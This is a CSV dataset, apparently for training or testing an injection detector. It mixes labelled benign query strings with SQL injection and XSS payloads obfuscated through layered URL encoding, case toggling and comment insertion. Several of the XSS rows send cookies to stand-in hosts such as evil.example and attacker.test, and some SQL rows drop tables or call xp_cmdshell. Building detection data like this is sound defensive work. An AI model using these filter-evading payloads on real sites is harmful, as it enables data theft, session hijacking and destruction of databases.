payload,label,techniques
%2527%253B%2520DROP%2520TABLE%2520users%253B%2520--,sqli,double_url_encode+comment_insertion
email=phone@example.com&page=9985&currency=usd,benign,
coupon=delta,benign,
%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
tab=camera&price_min=2833&size=m,benign,
qty=5543,benign,
q=jakarta&coupon=jakarta&limit=6746,benign,
coupon=report,benign,
redirect=/home&qty=8043&color=phone,benign,
category=dashboard,benign,
user_id=999&offset=2870,benign,
'/**/OR%0a'1'='1,sqli,whitespace
&#39;%3E&lt;script\u003Ealert\u00281\u0029%3C/script&gt;,xss,whitespace+comment_insertion+unicode_substitution
tab=dashboard&size=m,benign,
%253Cscript%253Ealert%2528document.cookie%2529%253C%252Fscript%253E,xss,double_url_encode+whitespace+unicode_substitution
session=3e68086,benign,
%3Csvg%20onload%3Dalert%281%29%3E,xss,comment_insertion+fallback_full_url_encode
%2522%253E%253Cscript%253Ealert%2525281%2529%253C%252Fscript%253E,xss,partial_url_encode+double_url_encode
&#39; oR%20EXISTS%28SeLECt%20%2A From%20users%29%20--,sqli,case_toggle+partial_url_encode+unicode_substitution
%3Cscript%3Eeval(atob%28%27YWxlcnQoMSk%3D%27))<%2Fscript%3E,xss,partial_url_encode+comment_insertion+case_toggle
qty=4531&view=grid,benign,
sort=desc&theme=dark&color=alice,benign,
page=268&user_id=4946&price_max=3636,benign,
ref=dashboard&name=phone&qty=5119,benign,
1%20OR%201%3D1,sqli,url_encode+whitespace
%253Cscript%253Ealert%2528document.cookie%2529%253C%252Fscript%253E,xss,double_url_encode+whitespace
%27%0AAND%2F%2A%2A%2F%28SELECT%09COUNT%28%2A%29%2509FROM%0Ausers%29%09%3E%2F%2A%2A%2F0%2F%2A%2A%2F--,sqli,whitespace+url_encode
session=3691889&callback=profile,benign,
&#39; OR '1%27=%271,sqli,unicode_substitution
%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,comment_insertion+fallback_full_url_encode
%2527%252509OR%25250a1%253D1%25250a--,sqli,whitespace+double_url_encode+case_toggle
' OR '1'%3D%271,sqli,partial_url_encode
%253Cdiv%2520onmouseover%253Dalert%25281%2529%253Ehover%253C%252Fdiv%253E,xss,double_url_encode
page=9823,benign,
sort=asc&id=9728,benign,
page=2522&lang=id&color=delta,benign,
sort=desc&offset=2206,benign,
\u0027%0aOR	SLEEP\u00286)='0,sqli,unicode_substitution+whitespace
name=orders&sort=desc,benign,
"""%250aUNION/**/selECT%09table_name%0aFROM/*%2A%2Finformation_schema.tables%09--",sqli,whitespace+case_toggle+partial_url_encode
%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
%253Cscript%25253Ealert%252528%252527xss%2527%2529%253C%25252Fscript%253E,xss,double_url_encode+partial_url_encode+case_toggle
"%27
and%20%28SELECT%20COUNT(%2A)	FroM%20users)	>	0%20--",sqli,partial_url_encode+case_toggle+whitespace
page=6437,benign,
price_max=8971&ref=invoice&city=citra,benign,
%25253Cvideo%25253E%25253Csource%252520onerror%25253Dalert%2525281%252529%25253E%25253C%25252Fvideo%25253E,xss,case_toggle+url_encode+double_url_encode
%3Cscript>document.location='http:/%2Fevil.example%2F'%2Bdocument.cookie<%2Fscript%3E,xss,whitespace+partial_url_encode+case_toggle
%2527%252520GROUP%2520BY%2520password%2520HAVING%2525201%25253D1%252520--,sqli,double_url_encode+unicode_substitution+partial_url_encode
%253Cmarquee%20onstart%3Dalert%281%29%3E,xss,url_encode+unicode_substitution+partial_url_encode
callback=invoice,benign,
admin%27 --,sqli,partial_url_encode
lang=en&callback=delta,benign,
theme=dark&price_min=1103&sort=desc,benign,
%253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+comment_insertion+double_url_encode
"\u0027%09UNION/**/SEL/**/ECT
NULL,%0aNULL,	NULL%0a--",sqli,whitespace+unicode_substitution+comment_insertion
page=9373&price_min=3644&format=json,benign,
"'	AND
(SELECT%0aCOUNT(*)/**/FROM
users)	>%090
--",sqli,whitespace
"1%3B
EXEc%0axp_cmdshell('dir'%29
--",sqli,case_toggle+partial_url_encode+whitespace
color=shoes&city=shoes&view=grid,benign,
%3Cscript%3Enew%20Image%28%29.src%3D%27http%3A%2F%2Fbad-host.example%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
redirect=/home&lang=en&q=jakarta,benign,
lang=en,benign,
city=budi&redirect=/home,benign,
%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E,xss,comment_insertion+fallback_full_url_encode
id=6671&offset=9153&search=orders,benign,
<script>new%0aImage().src='http://c2.example/?c='+document.cookie;</script>,xss,case_toggle+whitespace
session=3208a8c&price_min=2955,benign,
%3Cmarquee%20onstart%3Dalert%281%29%3E,xss,comment_insertion+case_toggle+fallback_full_url_encode
city=echo&coupon=phone,benign,
session=4449da7&currency=usd,benign,
email=orders@example.com&token=3268c40,benign,
%252527%252520AND%252520%252528SELECT%252520COUNT%252528%25252A%252529%252520FROM%252520users%252529%252520%25253E%2525200%252520--,sqli,url_encode+double_url_encode
id=2823,benign,
token=57ca662&search=phone&price_max=7998,benign,
%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,url_encode
1%27%20AND%201%3D1%20--,sqli,url_encode+comment_insertion
size=m&offset=3081&user_id=2239,benign,
%2527%250AHAVING%25250a1%253D1%252509--,sqli,whitespace+double_url_encode
ref=delta,benign,
user_id=558&offset=1507&category=foxtrot,benign,
qty=7553,benign,
ref=citra&price_max=9065,benign,
1%3B%20EXEC xp_cmdshell%28%27dir%27%29%20--,sqli,partial_url_encode+comment_insertion+unicode_substitution
%2522%2520UNIon%2520SelECT%2520table_name%2520FrOm%2520information_schema.tables%2520--,sqli,case_toggle+double_url_encode
%27 OR%20'1'%3D%271,sqli,partial_url_encode
city=report&view=grid,benign,
admin%27%20--,sqli,url_encode+case_toggle
sort=asc&size=m,benign,
format=json&limit=5027,benign,
%3Cstyle%3E%40import%20%27http%3A%2F%2Fevil.example%2Fxss.css%27%3B%3C%2Fstyle%3E,xss,case_toggle+comment_insertion+fallback_full_url_encode
offset=3372,benign,
%22%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20--,sqli,url_encode
%253Cscript%253Enew%2520Image%2528%2529.src%253D%2527http%253A%252F%252Fevil.example%252F%253Fc%253D%2527%252Bdocument.cookie%253B%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution
size=m&theme=dark,benign,
%27%20HAVING%201%3D1 --,sqli,partial_url_encode
%25253Cimg%252520src%25253Dx%252520onerror%25253Dthis.src%25253D%252527http%25253A%25252F%25252Fevil.example%25252F%252527%25252Bdocument.cookie%25253E,xss,url_encode+double_url_encode+comment_insertion
&lt;script%3Efetch\u0028\u0027http://evil.example/steal?c=%27+document.cookie\u0029&lt;/script&#62;,xss,whitespace+unicode_substitution
lang=en&sort=desc&redirect=/home,benign,
city=settings,benign,
%2527%2520OR%2520%25271%2527%253D%25271,sqli,double_url_encode+comment_insertion
%3Cmarquee%20onstart%3Dalert%281%29%3E,xss,url_encode+comment_insertion+case_toggle
\u003Cmarquee onstart=alert(1%29&gt;,xss,case_toggle+unicode_substitution+comment_insertion
tab=surakarta&redirect=/home&email=budget@example.com,benign,
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271,sqli,double_url_encode+case_toggle+whitespace
tab=shoes&limit=7787,benign,
limit=9799,benign,
<video>%3Csource%2F**/onerror%3Dalert(1%29><%2Fvideo%3E,xss,whitespace+partial_url_encode+comment_insertion
qty=2000&format=json&lang=id,benign,
user_id=622&search=foxtrot&email=citra@example.com,benign,
limit=2718&theme=dark&qty=9280,benign,
%253Csvg%2520onload%3Dalert%281%2529%253E,xss,partial_url_encode+url_encode+case_toggle
sort=desc&view=grid&q=orders,benign,
%253Ciframe%2520src%253Djavascript%253Aalert%25281%2529%253E,xss,double_url_encode+whitespace
sort=desc&view=grid&lang=id,benign,
redirect=/home&color=echo,benign,
"%27
OR%202%3D7%20--",sqli,partial_url_encode+whitespace
"'
OR/**/'a'='a",sqli,whitespace
&lt;script%3Edocument.location=%27http://attacker.test/&#39;+document.cookie</script\u003E,xss,comment_insertion+unicode_substitution
admin\u0027 --,sqli,unicode_substitution
user_id=7439&format=json&theme=dark,benign,
callback=citra,benign,
"admin'
--",sqli,whitespace+comment_insertion
sort=desc&price_min=5655,benign,
ref=citra&token=4754d96,benign,
color=budget&category=laptop&price_min=8822,benign,
%27; DR/*!50000*/OP TaBLE users; --,sqli,unicode_substitution+comment_insertion+case_toggle
%253Cscript%253Enew%2520Image%2528%2529.src%253D%2527http%253A%252F%252Fattacker.test%252F%253Fc%253D%2527%252Bdocument.cookie%253B%253C%252Fscript%253E,xss,case_toggle+double_url_encode
%3Cscript%3Enew%20Image%28%29.src%3D%27http%3A%2F%2Fevil.example%2F%3Fc%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E,xss,url_encode+comment_insertion
qty=4067&user_id=6819&sort=asc,benign,
user_id=9330,benign,
admin%2527%2520--,sqli,double_url_encode
price_min=7224&q=surakarta,benign,
user_id=6825,benign,
q=settings,benign,
1%252527%2520anD%2520SLEEP%25285%252529%252520--,sqli,partial_url_encode+case_toggle+double_url_encode
price_min=9791,benign,
%27%20UNION%2520SELECT%2520NULL%252C%2520NULL%252C%20NULL%2520--,sqli,url_encode+partial_url_encode+comment_insertion
%2527%2520UNION%2520SELECT%2520NULL%252C%2520NULL%252C%2520NULL%2520--,sqli,double_url_encode+case_toggle
'	GROUP%0aBY%0apassword/**/HAVING%0a5=9%0a--,sqli,whitespace
%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,comment_insertion+whitespace+fallback_full_url_encode
qty=5734,benign,
theme=dark&size=m,benign,
%3Cbody onload=alert%28'xss')\u003E,xss,unicode_substitution
id=2469&limit=3559&sort=asc,benign,
%3Cdetails%250aopen%2509ontoggle%3Dalert%281%29%3E,xss,whitespace+comment_insertion+url_encode
&#60;body%09onload=alert\u0028'xss%27%29>,xss,unicode_substitution+case_toggle+whitespace
tab=report&name=shoes&color=shoes,benign,
lang=en&city=orders,benign,
token=2ed1640&format=json,benign,
city=budi&session=beba3a,benign,
price_max=8334&sort=asc&search=alice,benign,
q=citra&qty=1660,benign,
search=budi,benign,
%3Csvg%20onload%3Dalert%281%29%3E,xss,url_encode
callback=dashboard&size=m,benign,
email=settings@example.com&id=6866,benign,
format=json&token=3573626&lang=en,benign,
format=json&coupon=book,benign,
%2527%252509AND%2509%2528SELECT%252509COUNT%2528%252A%2529%25250aFROM%2509users%2529%250A%253E%250A0%25250a--,sqli,comment_insertion+whitespace+double_url_encode
sort=desc&format=json&page=1670,benign,
format=json&color=citra,benign,
page=3269,benign,
1%27%20AND%202%3D2%20--,sqli,comment_insertion+fallback_full_url_encode
category=orders&ref=jakarta&price_min=4307,benign,
%3Cstyle%3E%40import%20%27http%3A%2F%2Fevil.example%2Fxss.css%27%3B%3C%2Fstyle%3E,xss,url_encode
<img%09src=x%09onerror=alert(1)>,xss,whitespace
%3Cscript%3Eeval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3C%2Fscript%3E,xss,url_encode
qty=3044&ref=book&session=12f212c,benign,
"%27%0aGROUP%09BY/**/password
HAVING%0a1=1/**/--",sqli,whitespace+case_toggle+unicode_substitution
%22%0auNion/**/SElect/**/table_name	fROM/**/information_schema.tables%0a--,sqli,unicode_substitution+case_toggle+whitespace
&lt;script\u003Efetch\u0028&#39;http://evil.example/steal?c='+document.cookie)</script%3E,xss,unicode_substitution
qty=603&lang=id,benign,
""" or ""1""=""1",sqli,case_toggle
1%0aOR	1%3D1,sqli,whitespace+partial_url_encode+case_toggle
user_id=6132&search=alice&sort=desc,benign,
email=phone@example.com,benign,
%3Cmarquee%20onstart%3Dalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
lang=en&price_max=2911,benign,
'	OR	'a'='a,sqli,comment_insertion+whitespace
&#39; Or EXISTS%28SeLEct * froM users\u0029 --,sqli,case_toggle+unicode_substitution
session=3aa6d07&price_max=6932,benign,
%25253Csvg%252520onload%25253Dalert%2525281%252529%25253E,xss,url_encode+double_url_encode+whitespace
1%2527%2520AND%25201%253D1%2520--,sqli,comment_insertion+double_url_encode
%2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution
callback=foxtrot&token=4d85b7b,benign,
<img%09src=x	onerror=alert(1)>,xss,whitespace+comment_insertion
%253Cscript%253Eeval%2528atob%2528%2527YWxlcnQoMSk%253D%2527%2529%2529%253C%252Fscript%253E,xss,double_url_encode
email=surakarta@example.com&page=8420,benign,
offset=6956&tab=jakarta&sort=asc,benign,
1%2527%2520AND%2520SLEEP%25285%2529%2520--,sqli,double_url_encode
format=json&sort=desc&currency=usd,benign,
size=m&page=9618&search=settings,benign,
%253Csvg%2520onload%253Dalert%25281%2529%253E,xss,double_url_encode+case_toggle+comment_insertion
id=3316,benign,
size=m&sort=desc,benign,
color=delta&callback=foxtrot,benign,
coupon=book&callback=report,benign,
%253Cinput%2520onfocus%253Dalert%25281%2529%2520autofocus%253E,xss,double_url_encode
q=surakarta,benign,
redirect=/home&sort=asc,benign,
%22%3E%3Cscript%253Ealert%25281%29%253C%252Fscript%253E,xss,comment_insertion+partial_url_encode+url_encode
%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,url_encode+comment_insertion+unicode_substitution
%27%29%20OR%20%28%271%27%3D%271,sqli,comment_insertion+url_encode
token=1aeefb9,benign,
admin&#39; --,sqli,comment_insertion+unicode_substitution
"&lt;style%3E@import
'http://evil.example/xss.css&#39;;</style&#62;",xss,comment_insertion+unicode_substitution+whitespace
%2527%2520oR%2520SLEEP%289%2529%3D%270,sqli,case_toggle+url_encode+partial_url_encode
1%3B%20EX%2F%2A%2150000%2A%2FEC%20xp_cmdshell%2528%5Cu0027dir%2527%2529%20--,sqli,unicode_substitution+comment_insertion+url_encode
token=1d0b159&lang=en,benign,
format=json,benign,
%2527%2520UNION%2520SELECT%2520username%252C%2520password%2520FROM%2520users%2520--,sqli,double_url_encode+case_toggle
1\u0027 AND 1=1 --,sqli,unicode_substitution
search=book&offset=7430&user_id=5299,benign,
category=budget&email=echo@example.com&lang=id,benign,
city=invoice,benign,
&#39; GROUP BY password HAVING 1=1 --,sqli,unicode_substitution+case_toggle
%27 HAVING%201=1%20--,sqli,partial_url_encode+case_toggle
lang=en&session=3075331&lang=id,benign,
redirect=/home&limit=6930&lang=en,benign,
name=dashboard&theme=dark,benign,
%25252527%25252520OR%252525201%25253D1%25252523,sqli,partial_url_encode+url_encode+double_url_encode
%27%20OR%20%271%27%3D%271,sqli,url_encode+comment_insertion+unicode_substitution
limit=4061&search=shoes&sort=desc,benign,
redirect=/home&offset=302&city=shoes,benign,
name=profile&offset=1295&view=grid,benign,
callback=profile,benign,
sort=asc&tab=alice,benign,
"<img
src=x	onerror=alert(1)>",xss,case_toggle+whitespace
size=m&format=json,benign,
%2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+unicode_substitution+comment_insertion
user_id=6392,benign,
search=dashboard&city=report&lang=en,benign,
%253Cscript%26%2362%3Bfetch%5Cu0028%27http%3A%2F%2Fbad-host.example%2Fsteal%3Fc%3D%5Cu0027%2Bdocument.cookie%5Cu0029%26%2360%3B%2Fscript%253E,xss,unicode_substitution+whitespace+url_encode
color=orders,benign,
q=echo&qty=2807,benign,
sort=asc&price_min=3240&offset=1507,benign,
%25253Cscript%25253Edocument.location%253D%2527http%25253A%25252F%25252Fattacker.test%25252F%2527%25252Bdocument.cookie%25253C%25252Fscript%25253E,xss,partial_url_encode+double_url_encode+case_toggle
size=m&category=settings,benign,
%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,xss,case_toggle+url_encode+unicode_substitution
'	OR/**/SLEEP(6)='0,sqli,whitespace
view=grid&id=9503&user_id=5280,benign,
ref=budget&qty=1735&session=3d02b68,benign,
limit=4730&city=budi,benign,
&#60;input onfocus=alert%281%29 autofocus\u003E,xss,unicode_substitution
city=surakarta,benign,
'; dROp TaBle%20users;%20--,sqli,partial_url_encode+case_toggle
session=14677d1&format=json&currency=usd,benign,
format=json&page=1443&price_max=6862,benign,
sort=desc&name=budget&category=profile,benign,
%3Cscript%3Edocument.location%3D%27http:%2F/c2.example%2F%27%2Bdocument.cookie&lt;/script%3E,xss,partial_url_encode+comment_insertion+unicode_substitution
%3Ciframe%2520src%253Djavascript%253Aalert%281%2529%253E,xss,url_encode+partial_url_encode+case_toggle
callback=laptop&token=5b871e8&limit=7743,benign,
%27%253B%20DROP%20TABLE%20users%3B%2520--,sqli,partial_url_encode+url_encode+comment_insertion
size=m&color=camera,benign,
ref=laptop,benign,
%27 OR SLEEP%285\u0029='0,sqli,unicode_substitution
price_min=1770&category=book,benign,
%3Cbody%20onload=alert('xss')%3E,xss,partial_url_encode
session=256cc62&lang=en,benign,
format=json&price_min=6036,benign,
callback=foxtrot&token=248db1d&redirect=/home,benign,
view=grid&color=jakarta,benign,
%253Cvideo%253E%253Csource%2520onerror%253Dalert%25281%2529%253E%253C%252Fvideo%253E,xss,double_url_encode+case_toggle
id=9078&lang=id,benign,
%3Cinput%2520onfocus%3Dalert%25281%2529%2520autofocus%3E,xss,comment_insertion+url_encode+partial_url_encode
user_id=9469&ref=orders&price_max=9344,benign,
%3Cbody onload=alert(&#39;xss\u0027\u0029>,xss,unicode_substitution
%25253Cscript%25253Ealert%252528document.cookie%252529%25253C%25252Fscript%25253E,xss,url_encode+whitespace+double_url_encode
%3Csvg onload=alert%281%29%3E,xss,partial_url_encode+unicode_substitution+case_toggle
%25252527%25252529%252520OR%252520%25252528%252525271%252526%25252339%25253B%25253D%252525271,sqli,unicode_substitution+url_encode+double_url_encode
%253Cmarquee%2520onstart%253Dalert%25281%2529%253E,xss,comment_insertion+double_url_encode
%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E,xss,double_url_encode
%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E,xss,url_encode+whitespace+unicode_substitution
%27%20unIoN%20SelECt%20NULL%2C%20NULL%2C%20NULL%20--,sqli,case_toggle+url_encode+whitespace
%25253Cvideo%25253E%25253Csource%252520onerror%253Dalert%25281%2529%253E%25253C%252Fvideo%253E,xss,double_url_encode+partial_url_encode+unicode_substitution
%253Cdiv%2520onmouseover%253Dalert%25281%2529%253Ehover%253C%252Fdiv%253E,xss,double_url_encode
tab=foxtrot,benign,
user_id=4920,benign,
sort=asc&callback=foxtrot&coupon=delta,benign,
admin%27%2520--,sqli,partial_url_encode+url_encode+comment_insertion
tab=surakarta&currency=usd,benign,
theme=dark&email=laptop@example.com,benign,
tab=settings&email=settings@example.com,benign,
price_max=9273&tab=dashboard&sort=desc,benign,
color=alice&name=budi&sort=asc,benign,
tab=shoes&user_id=7416&category=budget,benign,
%2522%2520UNION%2520SELECT%2520table_name%2520FROM%2520information_schema.tables%2520--,sqli,double_url_encode+whitespace
%25253Cinput%252520onfocus%2525253Dalert%252525281%25252529%25252520autofocus%2525253E,xss,double_url_encode+partial_url_encode+url_encode
id=3507&callback=echo&sort=desc,benign,
%27%20OR%20EXISTS%28SELECT * FROM users%29 --,sqli,partial_url_encode+unicode_substitution
callback=orders,benign,
token=ac6435&city=book&format=json,benign,
"1\u0027/**/AND%09SLEEP%285\u0029
--",sqli,unicode_substitution+whitespace
email=delta@example.com,benign,
tab=orders&session=5e59e27,benign,
view=grid&id=6069&currency=usd,benign,
%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fbad-host.example%2F%27%2Bdocument.cookie%3C%2Fscript%3E,xss,whitespace+fallback_full_url_encode
currency=usd&redirect=/home,benign,
%2527%2520HAVING%25201%253D1%2520--,sqli,double_url_encode+whitespace
category=citra&lang=en&price_max=5627,benign,
<video><source onerror%3Dalert(1)><%2Fvideo%3E,xss,partial_url_encode
%2527%2525250aUNION%25250aSELECT%250ANULL%252C%25250aNULL%252C%250ANULL%25252509--,sqli,whitespace+double_url_encode+partial_url_encode
%2527%2520OR%25201%253D1%2520--,sqli,double_url_encode
%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,url_encode
%3Cvideo%3E%3Csource%20onerror%3Dalert%281%29%3E%3C%2Fvideo%3E,xss,case_toggle+fallback_full_url_encode
category=invoice&limit=1771,benign,
%253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,double_url_encode+unicode_substitution+case_toggle
q=laptop&page=1436,benign,
limit=3156&sort=desc,benign,
%25253Cinput%252520onfocus%25253Dalert%2525281%252529%252520autofocus%25253E,xss,url_encode+double_url_encode+case_toggle
session=5556b82&ref=report&id=3520,benign,
q=camera&sort=asc&view=grid,benign,
<body/**/onload=alert('xss')>,xss,comment_insertion+whitespace
%2527%2520UNI%252F%25252A%25252150000%25252A%252FON%2520SELECT%2520NULL%252C%252520NULL%252C%252520NULL%252520--,sqli,comment_insertion+partial_url_encode+double_url_encode
lang=id&search=citra&id=1393,benign,
theme=dark&size=m&q=alice,benign,
city=camera&qty=9089,benign,
%3Cstyle%3E%2540import%20%2527http%3A%252F%2Fevil.example%2Fxss.css%2527%253B%3C%252Fstyle%3E,xss,url_encode+partial_url_encode
lang=en&sort=desc,benign,
%25253Ciframe%252520src%25253Djavascript%25253Aalert%2525281%252529%25253E,xss,url_encode+double_url_encode+unicode_substitution
size=m&qty=9325,benign,
search=shoes&coupon=echo&tab=citra,benign,
<svg/**/onload=alert(1)>,xss,whitespace
admin%2527%2520--,sqli,case_toggle+double_url_encode
%2527%25250aOR%252F%252A%252A%252F1%253D1%2523,sqli,whitespace+double_url_encode+case_toggle
1%253B%252520EXEC%2520xp_cmdshell%2528%252527dir%2527%2529%252520--,sqli,double_url_encode+partial_url_encode
%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,case_toggle+fallback_full_url_encode
token=2e8f884&page=2743&id=7901,benign,
user_id=8667&price_max=9087&tab=phone,benign,
city=settings&coupon=book&lang=id,benign,
%27%20OR%201%3D1%20--,sqli,partial_url_encode+comment_insertion
page=6245&lang=id,benign,
%252527%252520OR%2525201%2525253D1%25252520--,sqli,double_url_encode+url_encode+partial_url_encode
city=laptop&name=delta&session=331056d,benign,
price_min=4273&name=budget&lang=en,benign,
%22 UNI/**/ON SELeCt table_name frOM information_schema.tables --,sqli,comment_insertion+case_toggle+unicode_substitution
%27%2520AND%2520%2528SELECT%20COUNT%2528%252A%2529%20FROM%20users%29%2520%253E%200%2520--,sqli,partial_url_encode+url_encode
price_max=8085,benign,
callback=foxtrot,benign,
token=4432819&lang=en,benign,
%253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+double_url_encode
price_max=481&limit=7729,benign,
"\u0027%0aAND
%28SELECT	COUNT%28*\u0029/**/FROM/**/users%29%0a&#62;%0a0%0a--",sqli,whitespace+unicode_substitution
%252522%252520OR%252520%2525221%252522%25253D%2525221,sqli,double_url_encode+url_encode+unicode_substitution
%253Cscript%253Ealert%2528%2527xss%2527%2529%253C%252Fscript%253E,xss,case_toggle+double_url_encode
%25253Cscript%253Eeval%252528atob%2528%252527YWxlcnQoMSk%25253D%2527%252529%252529%25253C%25252Fscript%253E,xss,whitespace+partial_url_encode+double_url_encode
%255Cu0027%2520OR%25201%253D1%2523,sqli,unicode_substitution+double_url_encode
%252522%25253E%25253Cscript%25253Ealert%2525281%252529%25253C%25252Fscript%25253E,xss,double_url_encode+url_encode
"' UnIon SeleCT NULL, NULL, NULL --",sqli,case_toggle
<iframe	src=javascript:alert(1)>,xss,whitespace+comment_insertion
offset=5203,benign,
%3Cdetails%20open%20ontoggle%3Dalert%281%29%3E,xss,comment_insertion+fallback_full_url_encode
theme=dark&color=orders,benign,
%253Cscript%25253Enew%2520Image%252528%252529.src%253D%2527http%25253A%252F%252Fattacker.test%25252F%253Fc%25253D%2527%252Bdocument.cookie%25253B%25253C%25252Fscript%253E,xss,comment_insertion+double_url_encode+partial_url_encode
sort=desc&token=48be168,benign,
q=echo,benign,
session=203f2d2&view=grid&q=delta,benign,
